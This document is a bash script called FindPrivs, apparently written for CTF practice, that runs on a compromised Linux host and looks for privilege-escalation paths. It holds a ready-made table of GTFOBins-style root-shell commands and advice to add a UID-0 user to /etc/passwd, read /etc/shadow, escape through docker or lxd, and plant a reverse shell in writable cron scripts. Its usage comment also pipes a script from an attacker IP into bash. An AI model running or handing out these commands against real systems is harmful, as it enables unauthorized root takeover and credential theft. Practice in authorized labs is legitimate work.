#!/usr/bin/env bash
# FindPrivs — run ON a target after landing a shell (HTB/THM-style CTF, authorized only).
# Enumerates the common Linux privesc mechanisms (sudo, SUID/SGID, capabilities,
# cron, writable sensitive files, PATH hijacking, privileged groups, NFS) and
# cross-checks anything it finds against a small built-in GTFOBins-style table,
# then prints one plain VERDICT section telling you which path to try first.
#
# This does NOT exploit anything for you — it's a radar, not an autopilot.
# You still run the suggested command yourself and understand why it works.
#
# Usage (on the target, after SSH'ing in):
#   ./FindPrivs.sh
#   curl http://<your-ip>:8000/FindPrivs.sh | bash
#
# Prompts (when run interactively) for a directory to save results into;
# piped/non-interactive runs (e.g. curl | bash) skip the prompt and default
# to /tmp, since there's no terminal to read an answer from.
#
# This script runs ON THE TARGET, so it has no access to your attack box's
# ~/Neo/projects/<project>/Investigation-Notes.md and can't write to it
# directly. To file its output into that doc, run it from your attack box
# over SSH instead of on the target directly, piping straight into
# neo/lib/notes-lib.sh's CLI mode:
#
#   ssh user@<target> 'bash -s' < FindPrivs.sh | \
#       ~/Neo/lib/notes-lib.sh <project> log FindPrivs
#
# Already ran it on the target and have a results file sitting there instead?
# Copy it back (scp, or paste from the terminal) and pipe the file in the
# same way: `~/Neo/lib/notes-lib.sh <project> log FindPrivs < FindPrivsRESULTS.txt`

set -uo pipefail

if [[ -t 0 ]]; then
    read -r -p "Save results in which directory? [/tmp]: " OUTDIR
else
    OUTDIR=""
fi
OUTDIR="${OUTDIR:-/tmp}"

if [[ ! -d "${OUTDIR}" || ! -w "${OUTDIR}" ]]; then
    echo "[!] '${OUTDIR}' isn't a writable directory -- falling back to /tmp" >&2
    OUTDIR="/tmp"
fi

OUTFILE="${OUTDIR%/}/FindPrivsRESULTS.txt"

# Don't silently clobber a previous run's results.
if [[ -e "${OUTFILE}" ]]; then
    if [[ -t 0 ]]; then
        read -r -p "${OUTFILE} already exists -- overwrite? [y/N]: " overwrite
        if [[ ! "${overwrite}" =~ ^[Yy] ]]; then
            OUTFILE="${OUTDIR%/}/FindPrivsRESULTS-$(date +%Y%m%d-%H%M%S).txt"
        fi
    else
        OUTFILE="${OUTDIR%/}/FindPrivsRESULTS-$(date +%Y%m%d-%H%M%S).txt"
    fi
fi

exec > >(tee "${OUTFILE}") 2>&1

# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------

FINDINGS=()   # each entry: "RANK|SEVERITY|CATEGORY|detail"

sev_rank() {
    case "$1" in
        CRITICAL) echo 0 ;;
        HIGH)     echo 1 ;;
        MEDIUM)   echo 2 ;;
        LOW)      echo 3 ;;
        *)        echo 4 ;;
    esac
}

add_finding() {
    local sev="$1" cat="$2" detail="$3"
    FINDINGS+=("$(sev_rank "${sev}")|${sev}|${cat}|${detail}")
}

section() { printf '\n=== %s ===\n' "$*"; }
log()     { printf '[*] %s\n' "$*"; }

have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------------------
# GTFOBins-style cheat table: binary name -> one-line abuse command.
# Not exhaustive — covers the binaries that actually show up on beginner
# HTB/THM boxes. Anything found but not in this table still gets flagged,
# just with a pointer to gtfobins.github.io instead of a ready-made command.
# ---------------------------------------------------------------------------

declare -A GTFO_SUID=(
    [awk]='awk "BEGIN {system(\"/bin/sh -p\")}"'
    [find]='find . -exec /bin/sh -p \; -quit'
    [vim]='vim -c ":!/bin/sh"'
    [vi]='vi -c ":!/bin/sh"'
    [less]='less /etc/profile   (then type: !/bin/sh)'
    [more]='more /etc/profile   (then type: !/bin/sh)'
    [nano]='nano  (Ctrl+R Ctrl+X, then: reset; sh -p 1>&0 2>&0)'
    [python]='python -c "import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"'
    [python3]='python3 -c "import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"'
    [perl]='perl -e "exec \"/bin/sh\", \"-p\";"'
    [ruby]='ruby -e "exec \"/bin/sh\", \"-p\""'
    [php]='php -r "pcntl_exec(\"/bin/sh\", [\"-p\"]);"'
    [node]='node -e "require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})"'
    [tar]='tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
    [zip]='zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh -p"'
    [env]='env /bin/sh -p'
    [gdb]='gdb -nx -ex "!/bin/sh -p" -ex quit'
    [strace]='strace -o /dev/null /bin/sh -p'
    [nmap]='nmap --interactive   (then: !sh)   [older nmap only, else use --script]'
    [git]='PAGER="sh -c '"'"'exec /bin/sh -p 1>&0'"'"'" git -p help'
    [docker]='docker run -v /:/mnt --rm -it alpine chroot /mnt sh'
    [setarch]='setarch "$(arch)" /bin/sh -p'
    [timeout]='timeout 7d /bin/sh -p'
    [time]='time /bin/sh -p'
    [watch]='watch -x sh -c "reset; exec sh 1>&0 2>&0"'
    [sed]='sed -n "1e exec sh 1>&0" /etc/hosts'
    [systemctl]='systemctl link a unit file that ExecStarts /bin/sh, then systemctl enable --now it (see gtfobins)'
    [ssh]='ssh -o ProxyCommand=";sh 0<&2 1>&2" x'
    [cp]='cp itself onto a passwd/shadow-editing workflow -- see gtfobins.github.io/gtfobins/cp/'
    [dd]='dd used to overwrite /etc/passwd or /etc/shadow -- see gtfobins.github.io/gtfobins/dd/'
)

declare -A GTFO_CAP=(
    [cap_setuid]='python3 -c "import os; os.setuid(0); os.system(\"/bin/sh\")"'
    [cap_setgid]='python3 -c "import os; os.setgid(0); os.system(\"/bin/sh\")"'
    [cap_dac_read_search]='python3 -c "import ctypes,os; libc=ctypes.CDLL(None); print(open(\"/etc/shadow\").read())"'
    [cap_dac_override]='python3 -c "open(\"/etc/passwd\",\"a\").write(\"pwned::0:0::/root:/bin/bash\n\")"  (then: su pwned)'
    [cap_chown]='python3 -c "import os; os.chown(\"/etc/shadow\", os.getuid(), os.getgid())"  then edit it directly'
    [cap_sys_admin]='mount-based container/namespace escape -- see gtfobins.github.io for the binary in question'
    [cap_sys_ptrace]='ptrace-inject a shell into a root process -- see gtfobins.github.io for the binary in question'
)

# ---------------------------------------------------------------------------
banner() {
cat <<'EOF'

  ╔══════════════════════════════════════════╗
  ║              FindPrivs                   ║
  ║   quick Linux privesc radar for CTF use   ║
  ╚══════════════════════════════════════════╝

EOF
}

banner
log "Output also being saved to ${OUTFILE}"

# ---------------------------------------------------------------------------
section "System identity"
id
echo
hostname 2>/dev/null
uname -a 2>/dev/null
[[ -r /etc/os-release ]] && grep -E '^(NAME|VERSION)=' /etc/os-release

KERNEL="$(uname -r 2>/dev/null)"
add_finding "LOW" "kernel" "Kernel ${KERNEL} -- if nothing else pans out, searchsploit for known CVEs against this exact version."

# ---------------------------------------------------------------------------
section "sudo privileges"
if [[ -t 0 ]]; then
    SUDO_OUT="$(sudo -l 2>&1)"
else
    SUDO_OUT="$(sudo -n -l 2>&1)"
fi
echo "${SUDO_OUT}"

if echo "${SUDO_OUT}" | grep -qE 'password is required'; then
    add_finding "LOW" "sudo" "sudo -l needs an interactive password prompt -- rerun 'sudo -l' by hand (not piped) to check this."
elif echo "${SUDO_OUT}" | grep -qE '\(ALL(\s*:\s*ALL)?\)\s+ALL'; then
    add_finding "CRITICAL" "sudo" "You have full sudo rights (ALL : ALL) -- you already have root. Run: sudo su -"
else
    for bin in "${!GTFO_SUID[@]}"; do
        if echo "${SUDO_OUT}" | grep -qE "(^|[[:space:]/])${bin}([[:space:]]|\$)"; then
            if echo "${SUDO_OUT}" | grep -E "${bin}" | grep -qi NOPASSWD; then
                add_finding "CRITICAL" "sudo" "sudo lets you run '${bin}' with NOPASSWD. GTFOBins: sudo ${GTFO_SUID[$bin]}"
            else
                add_finding "HIGH" "sudo" "sudo lets you run '${bin}' (password required, but you have it). GTFOBins: sudo ${GTFO_SUID[$bin]}"
            fi
        fi
    done
fi

# ---------------------------------------------------------------------------
section "SUID / SGID binaries"
log "Scanning filesystem (up to 90s)..."

SUID_LIST="$(timeout 90 find / -path /proc -prune -o -perm -4000 -type f -print 2>/dev/null)"
echo "-- SUID --"
echo "${SUID_LIST}"

SGID_LIST="$(timeout 90 find / -path /proc -prune -o -perm -2000 -type f -print 2>/dev/null)"
echo "-- SGID --"
echo "${SGID_LIST}"

while IFS= read -r path; do
    [[ -z "${path}" ]] && continue
    base="$(basename "${path}")"
    if [[ -n "${GTFO_SUID[${base}]+x}" ]]; then
        add_finding "CRITICAL" "suid" "SUID binary ${path}. GTFOBins: ${GTFO_SUID[$base]}"
    fi
done <<< "${SUID_LIST}"

while IFS= read -r path; do
    [[ -z "${path}" ]] && continue
    base="$(basename "${path}")"
    if [[ -n "${GTFO_SUID[${base}]+x}" ]]; then
        add_finding "HIGH" "sgid" "SGID binary ${path} (group-level, still worth checking). GTFOBins: ${GTFO_SUID[$base]}"
    fi
done <<< "${SGID_LIST}"

# ---------------------------------------------------------------------------
section "Linux capabilities"
if have getcap; then
    log "Scanning filesystem (up to 60s)..."
    CAP_LIST="$(timeout 60 getcap -r / 2>/dev/null)"
    echo "${CAP_LIST}"

    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        path="$(awk '{print $1}' <<< "${line}")"
        for capname in "${!GTFO_CAP[@]}"; do
            if echo "${line}" | grep -qi "${capname}"; then
                add_finding "CRITICAL" "capability" "${path} has ${capname}. Abuse: ${GTFO_CAP[$capname]}"
            fi
        done
    done <<< "${CAP_LIST}"
else
    log "getcap not installed -- can't enumerate capabilities directly (uncommon to be missing; note it and move on)."
fi

# ---------------------------------------------------------------------------
section "Cron jobs"
[[ -r /etc/crontab ]] && { echo "-- /etc/crontab --"; cat /etc/crontab; }
for d in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
    [[ -d "${d}" ]] && { echo "-- ${d} --"; ls -la "${d}" 2>/dev/null; }
done
echo "-- crontab -l (current user) --"
crontab -l 2>&1

# Any script referenced by a root cron entry that we can write to is an
# instant win (root will run our code on its next tick).
for f in /etc/crontab /etc/cron.d/*; do
    [[ -f "${f}" ]] || continue
    while read -r cronscript; do
        [[ -z "${cronscript}" || ! -e "${cronscript}" ]] && continue
        if [[ -w "${cronscript}" ]]; then
            add_finding "CRITICAL" "cron" "Cron references ${cronscript}, which is writable by you. Append a reverse shell / chmod+s payload and wait for the next run."
        fi
    done < <(grep -oE '/[a-zA-Z0-9_./-]+\.sh' "${f}" 2>/dev/null)
done

# ---------------------------------------------------------------------------
section "Writable sensitive files"
for f in /etc/passwd /etc/shadow /etc/sudoers; do
    if [[ -w "${f}" ]]; then
        add_finding "CRITICAL" "writable-file" "${f} is writable by you directly -- edit it to add a root UID-0 user or a NOPASSWD sudoers line."
    fi
done

log "Scanning /etc for other world/user-writable files (up to 30s)..."
WRITABLE_ETC="$(timeout 30 find /etc -writable -type f 2>/dev/null)"
echo "${WRITABLE_ETC}"
if [[ -n "${WRITABLE_ETC}" ]]; then
    n="$(wc -l <<< "${WRITABLE_ETC}")"
    add_finding "MEDIUM" "writable-file" "${n} file(s) under /etc are writable by you -- see full list above/in ${OUTFILE}, check if any are loaded by a root process."
fi

# ---------------------------------------------------------------------------
section "PATH hijacking"
echo "PATH=${PATH}"
IFS=':' read -ra PATH_DIRS <<< "${PATH}"
for d in "${PATH_DIRS[@]}"; do
    if [[ "${d}" == "." || "${d}" == "" ]]; then
        add_finding "MEDIUM" "path" "PATH contains the current directory ('.') -- a root script/cron that runs a bare command name from a directory you control can be hijacked."
    elif [[ -w "${d}" ]]; then
        add_finding "HIGH" "path" "PATH directory ${d} is writable by you -- if any root-run script calls a bare command name (no full path) that resolves here first, drop a malicious binary with that name."
    fi
done

# ---------------------------------------------------------------------------
section "Privileged group membership"
GROUPS_OUT="$(id -Gn 2>/dev/null)"
echo "${GROUPS_OUT}"
for g in docker lxd lxc adm disk video root; do
    if grep -qw "${g}" <<< "${GROUPS_OUT}"; then
        case "${g}" in
            docker) add_finding "CRITICAL" "group" "You're in the 'docker' group -- mount the host filesystem: docker run -v /:/mnt --rm -it alpine chroot /mnt sh" ;;
            lxd|lxc) add_finding "CRITICAL" "group" "You're in the '${g}' group -- build/import a privileged container image to mount the host filesystem as root (see HTB 'lxd privesc' writeups for exact steps)." ;;
            disk) add_finding "HIGH" "group" "You're in the 'disk' group -- you can read raw block devices directly with debugfs/dd (e.g. reading /dev/sda's ext4 filesystem for /etc/shadow)." ;;
            adm) add_finding "LOW" "group" "You're in the 'adm' group -- you can read most system logs under /var/log, worth grepping for leaked creds." ;;
        esac
    fi
done

# ---------------------------------------------------------------------------
section "NFS no_root_squash"
if [[ -r /etc/exports ]]; then
    EXPORTS="$(grep -v '^\s*#' /etc/exports 2>/dev/null)"
    echo "${EXPORTS}"
    if echo "${EXPORTS}" | grep -q 'no_root_squash'; then
        add_finding "HIGH" "nfs" "/etc/exports has a no_root_squash share -- from an attacker machine, mount it and create a SUID root binary; root on the client maps to root on the share."
    fi
else
    log "/etc/exports not present or not readable."
fi

# ---------------------------------------------------------------------------
section "VERDICT"

if [[ "${#FINDINGS[@]}" -eq 0 ]]; then
    cat <<'EOF'
No obvious privesc path found by this pass.

Next steps:
  - Run pspy64/pspy32 in the background to catch a scheduled job live
    (things this scan can only see a static snapshot of).
  - Run linpeas.sh for a deeper, noisier second opinion.
  - Check the kernel version above against searchsploit for a local
    kernel exploit.
EOF
else
    SORTED="$(printf '%s\n' "${FINDINGS[@]}" | sort -t'|' -k1,1n)"

    TOP="$(head -n1 <<< "${SORTED}")"
    TOP_SEV="$(cut -d'|' -f2 <<< "${TOP}")"
    TOP_CAT="$(cut -d'|' -f3 <<< "${TOP}")"
    TOP_DETAIL="$(cut -d'|' -f4- <<< "${TOP}")"

    printf 'PATH FOUND -- try this first: [%s / %s]\n\n  %s\n\n' \
        "${TOP_SEV}" "${TOP_CAT}" "${TOP_DETAIL}"

    N="${#FINDINGS[@]}"
    if [[ "${N}" -gt 1 ]]; then
        echo "Other findings, most to least promising:"
        tail -n +2 <<< "${SORTED}" | while IFS='|' read -r _ sev cat detail; do
            printf '  [%s / %s] %s\n' "${sev}" "${cat}" "${detail}"
        done
    fi
fi

echo
log "Full output saved to ${OUTFILE}"
log "Ingest into your notes from the attack box:"
log "  ~/Neo/privesc/run-findprivs.sh <project> user@<target>"
log "Or log-only: ~/Neo/lib/notes-lib.sh <project> log FindPrivs < ${OUTFILE}"
